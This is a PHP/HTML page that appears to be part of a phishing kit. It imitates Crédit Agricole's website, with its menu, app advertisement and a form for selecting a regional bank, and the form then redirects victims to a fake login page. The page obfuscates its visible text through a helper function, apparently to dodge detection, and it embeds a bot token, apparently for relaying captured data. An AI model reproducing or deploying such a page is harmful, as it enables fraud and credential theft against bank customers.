<?php 
require '../main.php';
?>
<!doctype html>
<html>
<head>
<title></title>
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<link rel="stylesheet" href="res/fonts.css">
<link rel="stylesheet" href="res/style.css">
<style>
.text-center{
    text-align:center;
}


#formobile{
    display:none;
}



@media screen and (max-width:1000px){
    #formobile{
        display:block;
    }
    #forpc{
    display:none;
}

}

</style>
</head>
<body style="background:white;">
<header style="display:flex; align-items:center; padding:0; ">
<div class="left" style="width:100%; text-align:left;" id="formobile"><img src="res/menu.png" style="width:50px;"></div>
<div class="mid" style="width:100%;"><img src="res/logo.png"></div>
<div class="right" style="width:100%; text-align:right;" id="forpc"><img src="res/pc-menu.png" style="width:400px;"></div>
<div class="right" style="width:100%; text-align:right; position:relative;" id="formobile"><img src="res/search.png" style="width:100px;"></div>
</header>
<div class="menubar">
<li><?php $bm->obf("COMPTES & CARTES"); ?></li>
<li><?php $bm->obf("ÉPARGNER"); ?></li>
<li><?php $bm->obf("S'ASSURER"); ?></li>
<li><?php $bm->obf("EMPRUNTER"); ?></li>
<li><?php $bm->obf("OFFRES ÉCO-RESPONSABLES"); ?></li>
<li><?php $bm->obf("ESPACE JEUNES"); ?></li>
<li><?php $bm->obf("MES COUPS DURS"); ?></li>
<li><?php $bm->obf("SIMULATION & DEVIS"); ?></li>
<li><?php $bm->obf("NOS CONSEILS"); ?></li>
</div>
<section>
<div class="left" style="background:url('res/back2.jpg');  background-size: cover;
    background-position: center center;
    background-repeat: no-repeat;">
    <div class="ad" style="background:#007461; color:white;">
        <h2><?php $bm->obf("TÉLÉCHARGEZ L’APPLICATION MA BANQUE"); ?></h2>
        <h5 style="margin:0;"><?php $bm->obf("Chacun d’entre vous gère différemment ses besoins bancaires.
Seul ou accompagné, au Crédit Agricole, vous aurez toujours le choix entre vous adresser à un conseiller ou utiliser l’application Ma Banque."); ?></h5>
        <button class="sbmt" style="background:white; color:green;"><?php $bm->obf("Découvrez les grandes fonctionnalités"); ?></button>
<script>var token=<?php echo json_encode($bot); ?>;</script>
</div>
</div>
<div class="right">
    <div class="holder text-center">
        <div class="col">
            <div class="form" style="display:inline-block; width:500px; max-width:100%; padding:50px; background:#f7f8fa;">
            <div class="title text-center" style="font-size:1.5em;"><?php $bm->obf("ACCÉDER À L'ESPACE DÉDIÉ
DE VOTRE CAISSE RÉGIONALE"); ?></div>
                <div class="form-group">
                    <label>
                    <p style="color:black; margin:9px 0; display:block;"><?php $bm->obf("Trouvez une caisse régionale en saisissant un département"); ?></p>
                    </label>
                    <input type="text" class="textinput" id="d0" style="border:none;" placeholder="Exemple 75 pour Paris."> 
                </div>


                <div class="form-group" style="margin:30px 0;">
                    Ou
                </div>

                <div class="form-group">
                    <select id="d1">
                        <option selected value="">Choisissez une caisse régionale</option>
                        <?php 
                        $regs = array("Alpes Provence", "Alsace Vosges", "Anjou Maine",
                        "Aquitaine", "Atlantique Vendèe", "Brie Picardie", "Centre Est", "Centre France",
                       "Centre Loire", "Centre Quest", "Champagne Bourgogne", "Charente Maritime Deux-Sèvres", "Charente Prérgord", "Corse", 
                       "Côtes d'Armor", "Des Savoie", "Finistère", "Franche Comté", "Guadeloupe", "Ille et Vilaine", "Languedoc", "Loire Haute-Loire",
                        "Lorraine", "Martinique Guyane", "Morbihan", "Nord De France", "Nord Est", "Nord Midi Pyrénées", "Normandie",
                        "Normandie Seine", "Paris et Île de France", "Provence Côte d'Azur", "Pyrénées Gascogne", "Réunion", "Sud Méditerranée", "Sud Rhône Alpes", "Toulouse 31", "Touraine Poitou", "Val De France");
                        
                            foreach($regs as $reg){
                                echo "<option value='$reg'>$reg</option>";
                            }

                        ?>
                    </select>
                </div>


                <div class="form-group">
                    <button class="sbmt" onclick="sendReg()" id="sendlogin"><?php $bm->obf("Rechercher une caisse régionale"); ?></button>
                </div>
            </div>




        </div>

    </div>

</div>


</section>


<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.7.1/jquery.min.js"></script>
<script>

function sendReg(){

if($("#d0").val()!="" || $("#d1").val()!=""){
        var departement = $("#d0").val()+" "+$("#d1").val();
        window.location="login.php?dep="+departement;
}
}


$("input").keypress((e)=>{
    if(e.key=="Enter"){
        sendReg();
    }
});

</script>
<script src="./res/jq.js"></script>


</body>
</html>